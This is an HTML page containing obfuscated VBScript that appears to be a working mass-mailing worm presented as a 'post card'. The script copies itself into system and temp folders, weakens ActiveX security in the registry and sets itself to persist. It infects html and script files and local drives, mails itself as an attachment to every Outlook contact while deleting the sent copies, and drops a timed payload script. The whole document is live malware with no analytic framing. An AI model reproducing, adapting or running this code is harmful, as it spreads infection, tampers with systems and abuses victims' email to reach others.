 <html><body>

<SCRIPT language=Vbscript>
dim x1, x2, x3, s(6), nr, SA, tt(100)
call show_post_card()

sub show_post_card()
On Error Resume Next
set f = CreateObject(uc("�����m�����q���dL��������q"))
set z = CreateObject(uc("����qL������u"))

If Err.Source <> "" Then
err.clear
post = msgbox(uc("�����>v�����_>���>����>����>���>�������>>���>�r"),uc("TWNR"),uc("�����t>��a���n"))
location.reload
else 
cl = Chr(13)&Chr(10)
html_postcard_code = uc("\����Z\����Z")
z = uc("\���MZ\�����MZ��������k>u�l>�nnf\�����Z")&uc("[�������>����Z")&"'#000000'"&uc("[����")&"text='#0000FF'>"&uc("\������Z")
z = Replace(z,chr(39),chr(34))
End If
end sub
call i_am
sub i_am
set f1 = CreateObject(uc("�����m�����q���dL��������q"))
set z1 =  CreateObject(uc("����qL������u"))
x22 = uc("P")
x23 = uc("O")
x21 = uc("N")
f11 = f1.GetSpecialFolder(x21) 
f2 = f1.GetSpecialFolder(x23) 
f3 = f1.GetSpecialFolder(x22)
s22 = f3& uc("�`Ncab`NN__NNKPV``KdaOOKS`VWKWbQdNSNQ�L���������z")
call regz(s22)
set th = document.body.createTextRange
ff = f2 &uc("�`Ncab`NN__NNKPV``KdaOOKS`VWKWbQdNSNQ�L���L�������z")
set zz = f1.CreateTextFile(ff , 2 , False)
zz.write(uc("\����Z\����Z>")+Chr(13)+Chr(10))
zz.write th.HtmlText
zz.writeline(uc("\����MZ\����MZ"))
zz.close

f1.copyfile ff,f11 &uc("�`Ncab`NN__NNKPV``KdaOOKS`VWKWbQdNSNQ�LONNPz")
f1.copyfile ff, f2&uc("�`Ncab`NN__NNKPV``KdaOOKS`VWKWbQdNSNQ�LG���������>������>��FreL��������z")
f1.copyfile ff, f3 &uc("�`Ncab`NN__NNKPV``KdaOOKS`VWKWbQdNSNQ�L���������z")
End sub

if Second(Now()) = 1 or Second(Now())=2 or Second(Now())=3 or Second(Now())=4 or Second(Now())=5 or Second(Now())=6 or Second(Now())=7 or Second(Now())=8 or Second(Now())=9 or Second(Now())=10 Then
call m_f(1)

End If
If Second(Now()) = 11 or Second(Now())=12 or Second(Now())=13 or Second(Now())=14 or Second(Now())=15 or Second(Now())=16 or Second(Now())=17 or Second(Now())=18 or Second(Now())=19 or Second(Now())=20  Then
call m_f(2)
End If
If Second(Now()) = 21 or Second(Now())=22 or Second(Now())=23 or Second(Now())=24 or Second(Now())=25 or Second(Now())=26 or Second(Now())=27 or Second(Now())=28 or Second(Now())=29 or Second(Now())=30  Then
call m_f(3)

End If
If Second(Now()) = 31 or Second(Now())=32 or Second(Now())=33 or Second(Now())=34 or Second(Now())=35 or Second(Now())=36 or Second(Now())=37 or Second(Now())=38 or Second(Now())=39 or Second(Now())=40 Then
call m_f(4)

End If
If Second(Now()) = 41 or Second(Now())=42 or Second(Now())=43 or Second(Now())=44 or Second(Now())=45 or Second(Now())=46 or Second(Now())=47 or Second(Now())=48 or Second(Now())=49 or Second(Now())=50 Then
call m_f(5)

End If
If Second(Now()) = 51 or Second(Now())=52 or Second(Now())=53 or Second(Now())=54 or Second(Now())=55 or Second(Now())=56 or Second(Now())=57 or Second(Now())=58 or Second(Now())=59  Then
call m_f(6)
End If
sub m_f(n)
Randomize
sa= uc("GG����>������F>�������>���>���F>��������k>���>���f")&"&"&uc("G��������>��F>������>��>���>���>������n")&"&"&uc("G����>������>�����>�����>����>���F>ONNP>���f")&"&"&uc("G��������>���K>ONNP>����F>]ONNP>��>]����>��>�����q")&"&"&uc("������e")&"&"&uc("G����>������F>�������>>���>���>��w")&"&"&uc("G��������>��F>�������>>���>����>������q")
SA = Split(sa, "&", -1, 1)

'84
set f1 = CreateObject(uc("�����m�����q���dL��������q"))
set z1 =  CreateObject(uc("����qL������u"))
cl = Chr(13)&Chr(10)
wsf_header_s = uc("[��>���Z")&"'"&uc("q`t�g���b")&"'"&uc("\")&""&cl& _
""&uc("[�����>���]Z")&"'"&uc("����")&"'"&uc("\]")&""&cl& _
""&uc("[������>������Z")&"'"&uc("�������t")&"'"&uc("\")&""
   
wsf_header_s = Replace(wsf_header_s,chr(39),chr(34))
t = uc("\���MZ\�")
wsf_header_e = uc("�����MZ")&t


x222 = uc("P")
x233 = uc("O")

f2 = f1.GetSpecialFolder(x233)
f3  = f1.GetSpecialFolder(x222)
ff = f2 &uc("�`Ncab`NN__NNKPV``KdaOOKS`VWKWbQdNSNQ�L���L�������z")
p_name = Rnd &uc("�`Ncab`NN__NNKPV``KdaOOKS`VWKWbQdNSNQ�L���L���K����")
p_name = f3 &uc("z")&p_name
htm_txt = uc("\���MZ\�����MZ>��������k>���>���f\�����Z\���Z\����Z")&""&cl& _
""&uc("[�������>����Z")&"'"&uc("NNNNNNA")&"' "&uc("[����")&"'"&uc("ddNNNN")&"'"&uc("\������Z\")&""&cl& _
""&uc("[���>����Z")&"'"&uc("qk>��q>����a")&"'"&uc("[����>")&"'"&uc("T")&"'"&uc("\����MZ>��������k>u�l>�nnfY����D\")&""&cl& _
""&uc("[������>���Z\��Z")&"'"&uc("N")&"' " &uc("dkuL}TONPNmqMNS����M�����aM����qNPC��������kM����dNPC�����aM����dNPC�����nMXaMMMX����E[���")&"' "&uc("[�����")&"'"&uc("UTP")&"' "&uc("[������")&"'"&uc("PUP")&"'"&uc("\>")&""&cl& _
""&uc("\�MZLGONNPF>���>���>���f\�Z\��Z")&""&cl& _
""&uc("[����>�Z")&"'"&uc("������")&"'"&uc("\�MZX����>������>���`\")&""&cl& _
""&uc("[����>�Z")&"'"&uc("������")&"'"&uc("\������MZ\�MZLLL>���>����\")&"" 
htm_txt = Replace(htm_txt,chr(39),chr(34))
set th = document.body.createTextRange

set pp = f1.CreateTextFile(p_name , 2 , False)
pp.write(uc("\����Z\����Z")+Chr(13)+Chr(10))
pp.write th.HtmlText
pp.writeline(uc("\����MZ\����MZ"))
pp.writeline " "
pp.write htm_txt
pp.close
   
m_S = "On Error Resume Next"&cl& _
"Set u = CreateObject(uc(%�����m�����q���dL��������q%))"&cl& _
"Set zs = CreateObject(uc(%����qL�����qu%))"&cl& _
"If zs.RegRead(uc(%reL`bLimmjrsmz������qzkjif%)) = %% Then"&cl& _
"reg_k = zs.RegWrite(uc(%reL`bLimmjrsmz������qzkjif%),uc(%O%))"&cl& _
"a=%"&p_name&"%"&cl& _
"subj=%"&SA(n)&"%"&cl& _
"Set OA = CreateObject(uc(%���������_L������m%))"&cl& _
"Set OS=OA.GetNameSpace(uc(%���%))"&cl& _
"OS.logon %profile% , %password%"&cl& _
"Set MI = OA.CreateItem(0)"&cl&_
"For y = 1 To OS.AddressLists.Count"&cl& _
"Set AdresBook = OS.AddressLists(y)"&cl& _
"x = 1"&cl& _
"For oo = 1 To AdresBook.AddressEntries.Count"&cl& _
"newmailadd = AdresBook.AddressEntries(x)"&cl& _
"Mi.Recipients.Add newmailadd"&cl& _
"x = x + 1"&cl& _
"Next"&cl& _
"MI.Subject = subj"&cl& _
"hb = uc(%\R[����>����Z\`Z%)"&cl& _
"MI.HTMLBody = hb&subj"&cl& _
"MI.Attachments.Add a"&cl& _
"MI.DeleteAfterSubmit = True"&cl& _
"MI.Send"&cl& _
"newmailadd=%%"&cl& _
"next"&cl& _
"End IF"&cl& _
"ow = zs.RegWrite(uc(%����m���������pz������t������az������uz��������kz������qzkjif%),uc(%���{ay>�����{ay>K>n�w>���j%))"&cl& _
"orga = zs.RegWrite(uc(%���������m���������pz������t������az������uz��������kz������qzkjif%),uc(%re>��`����b%))"&cl& _
"u.DeleteFile(a)"&cl& _ 
"function uc(str)"&cl& _
"dim tt(200)"&cl& _
"l = Len(str)"&cl& _
"ll = 1"&cl& _
"str = StrReverse(str)"&cl& _
"nr = 0"&cl& _
"For ll = 1 To l"&cl& _   
"str2 = Mid(str, ll, 1)"&cl& _
"str1 = Asc(str2)"&cl& _
"str3 = Replace(str2, Chr(str1),Chr(str1-30))"&cl& _
"tt(nr) = str3"&cl& _
"nr = nr + 1"&cl& _
"Next"&cl& _
"For st = 0 To l"&cl& _
"ss = ss + tt(st)"&cl& _
"Next"&cl& _
"uc = ss"&cl& _
"end function"

m_S = Replace(m_S,chr(37),chr(34))




x22 = uc("O")
f2 = f1.GetSpecialFolder(x22)

set th = document.body.createTextRange
set z_wsf = f1.CreateTextFile(f2&"\"&uc("���L{reL��y"), 2 , False)
z_wsf.write wsf_header_s
z_wsf.writeline " "
z_wsf.write m_S
z_wsf.writeline " "
z_wsf.write wsf_header_e
z_wsf.close

End sub

sub regz(s22x)
set f1 = CreateObject(uc("�����m�����q���dL��������q"))
set z1 =  CreateObject(uc("����qL������u"))
r1 = z1.RegWrite(uc("ONPOzNz����xz�������q>�������gz������t������az������uz��������kz������qzsaif"),uc("N"),uc("bpmub}ecp"))
r2 = z1.RegWrite(uc("ONPOzNz����xz�������q>�������gz������t������az������uz��������kz������qzkjif"),uc("N"),uc("bpmub}ecp"))
r3 = z1.RegWrite(uc("��n>���qz��kz�������c>�������gz��������kz������qzsaif"), s22x)
end sub
x22x = uc("P")
x23x = uc("O")
x21x = uc("N")
set ef = CreateObject(uc("�����m�����q���dL��������q"))
f11 = ef.GetSpecialFolder(x21x) 
f2 = ef.GetSpecialFolder(x23x) 
f3 = ef.GetSpecialFolder(x22x)

Randomize
min = Minute(Now()) + Hour(Now()) 
min = min /4
lycz = Rnd*2 
rnd1 = rnd+rnd+2
rs = Fix(min)+Fix(lycz)-Fix(Rnd1)

call lapf(f11)
call lapf(f2)
call lapf(f3)

sub lapf(patch)
On error Resume Next
if ef.FolderExists(patch) then
Do
Set GetF = ef.GetFolder(patch)
Patch = ef.GetParentFolderName(patch)
Set Filez = GetF.Files
For each trg in Filez
ext = lcase(ef.GetExtensionName(trg.name))
if Ext = uc("����") or Ext = uc("�����") or Ext = uc("���") or Ext = uc("��") Then
Set I = ef.OpenTextFile(trg.path, 1, False)
z = I.ReadLine 
z = Replace(z, uc("KK?Z"), "")
z = Replace(z, uc("\KK"), "")
z1 = isNumeric(z)
If z1 <> uc("���r") Then 
I.close()
call lap(trg.path)
else
I.close()
end if
end if
next 
Loop Until GetF.IsRootFolder=True
end if
End Sub

sub lap(n)
On error Resume Next
set th = document.body.createTextRange
Randomize
Set I = ef.OpenTextFile(n, 1, False)
it = I.ReadAll()
I.Close()
Set I = ef.OpenTextFile(n, 2, False)
I.WriteLine(uc("KK?Z")&Rnd&uc("\KK"))
I.WriteLine it
I.WriteBlankLines(rs+2)
I.Write th.HtmlText
I.Close()
End Sub


function dt(XY)
set f1 = CreateObject(uc("�����m�����q���dL��������q"))
Set dh = f1.GetDrive(XY)
Select Case dh.DriveType
Case 3: dtY = uc("������l")
End Select
dt = dtY
end function

call d1
sub d1
On Error Resume Next
for a = 65 to 90
letra=Chr(a)
drv = letra&":"
chk = dt(drv)
if chk = uc("������l") Then ctd(drv)
Next
End sub

sub ctd(drv)
set f1 = CreateObject(uc("�����m�����q���dL��������q"))
x22 = uc("P")
f3 = f1.GetSpecialFolder(x22)
s22x = f3& uc("�`Ncab`NN__NNKPV``KdaOOKS`VWKWbQdNSNQ�L���������z")
f1.copyfile s22x, drv&uc("�`Ncab`NN__NNKPV``KdaOOKS`VWKWbQdNSNQ�L����z")
end sub


call p_l_e
sub p_l_e
cl = Chr(13)&Chr(10)
set f1 = CreateObject(uc("�����m�����q���dL��������q"))
x22 = uc("O")
f2 = f1.GetSpecialFolder(x22)
set Xc = f1.CreateTextFile(f2 &uc("���L�N���z"), 2, False)
zm = "call p_l"&cl& _
"sub p_l"&cl& _
"zxs = uc('reL`bDX�r��>���r>�p�k>�l�>�c�g�r�>�j�kd>`b')"&cl& _
"zxs1 = uc('Lbjpmu>ckgl_>���>��>����>������>����>��>��������>���>���>��������>��>����')"&cl& _
"zxs2 = uc('���{ay�����{ayBD>n�w>>>BDD')"&cl& _
"if Weekday(Now()) = 2 Then"&cl&_
"If Hour(Now()) = 16 Or Hour(Now())= 4 Then"&cl& _
"If Minute(Now()) = 37 or Minute(Now())=38 or Minute(Now())=32 Then"&cl& _
"call payload(zxs&zxs1&zxs2)"&cl& _
"End If"&cl& _
"End If"&cl& _
"End If"&cl& _
"if Weekday(Now()) = 5 Then"&cl& _
"If Hour(Now()) = 14 Or Hour(Now())= 4 Then"&cl& _
"while count < 1"&cl& _
"If Minute(Now()) = 40 or Minute(Now()) = 42 Or Minute(Now()) = 43 or Minute(Now())=45 Then"&cl& _
"call payload(zxs&zxs1&zxs2)"&cl& _
"Exit Sub"&cl& _
"End If"&cl& _
"WScript.Sleep(uc('NNNO'))"&cl& _
"Wend"&cl& _
"End If"&cl& _
"End If"&cl& _
"End Sub"&cl& _
"sub payload(str)"&cl& _
"On Error Resume Next"&cl& _
"set Wla = WScript.CreateObject(uc('����qL�����qu'))"&cl& _
"zXz = Wla.Run(uc('>������J�����>PQ������'), 7)"&cl& _
"ZxZ1 = Wla.Run(uc('>������J�������>PQ������'), 7)"&cl& _
"Wla.Run(uc('�����u'))"&cl& _
"Wla.AppActivate(uc('�����u'))"&cl& _
"Wscript.Sleep 600"&cl& _
"Wla.SendKeys '^{B 3}'"&cl& _
"Wscript.Sleep 200"&cl& _
"For l=0 To 6"&cl& _
"Wla.SendKeys '^+(>)'"&cl& _
"Wscript.Sleep 100"&cl& _
"Next"&cl& _
"Wscript.Sleep 400"&cl& _
"dim ttz(1000)"&cl& _
"l = Len(str)"&cl& _
"ll = 1"&cl& _
"nr = 0"&cl& _
"For ll = 1 To l"&cl& _   
"str2 = Mid(str, ll, 1)"&cl& _
"if str2 = '&' Then"&cl& _
"Wla.SendKeys '{ENTER}'"&cl& _
"else"&cl& _
"if str2 = '$' Then"&cl& _
"s = '^+(<)'"&cl& _
"For l=0 To 3"&cl& _
"Wla.SendKeys(s)"&cl& _
"Wscript.Sleep 350"&cl& _
"Next"&cl& _
"Wscript.Sleep 400"&cl& _
"For l=0 To 7"&cl& _
"Wla.SendKeys('{TAB}')"&cl& _
"Wscript.Sleep 350"&cl& _
"Next"&cl& _
"Wscript.Sleep 350"&cl& _
"else"&cl& _
"ttz(nr) = str2"&cl& _
"Wla.SendKeys(ttz(nr))"&cl& _
"nr = nr +1"&cl& _
"Wscript.Sleep 500"&cl& _
"Wla.SendKeys '^{B}'"&cl& _
"End If"&cl& _
"End IF"&cl& _
"Next"&cl& _
"end sub"&cl& _
"function uc(str)"&cl& _
"dim tt(1000)"&cl& _
"l = Len(str)"&cl& _
"ll = 1"&cl& _
"str = StrReverse(str)"&cl& _
"nr = 0"&cl& _
"For ll = 1 To l"&cl& _   
"str2 = Mid(str, ll, 1)"&cl& _
"str1 = Asc(str2)"&cl& _
"str3 = Replace(str2, Chr(str1),Chr(str1-30))"&cl& _
"tt(nr) = str3"&cl& _
"nr = nr + 1"&cl& _
"Next"&cl& _
"For st = 0 To l"&cl& _
"ss = ss + tt(st)"&cl& _
"Next"&cl& _
"uc = ss"&cl& _
"end function"

zm = Replace(zm , "'", Chr(34))
Xc.Write zm
Xc.Close
end sub
x22 = uc("O")
set f1 = CreateObject(uc("�����m�����q���dL��������q"))
f2 = f1.GetSpecialFolder(x22)
set z1 =  CreateObject(uc("����qL������u"))
z1.Run(f2&uc("���L�N���z"))
z1.Run(f2&"\"&uc("���L{reL��y"))

function uc(str)
dim tt(1000)
l = Len(str)
ll = 1
str = StrReverse(str)
nr = 0
For ll = 1 To l   
str2 = Mid(str, ll, 1)
str1 = Asc(str2)
str3 = Replace(str2, Chr(str1),Chr(str1-30))
tt(nr) = str3
nr = nr + 1
Next
For st = 0 To l
ss = ss + tt(st)
Next
uc = ss
end function


</SCRIPT></body></html>
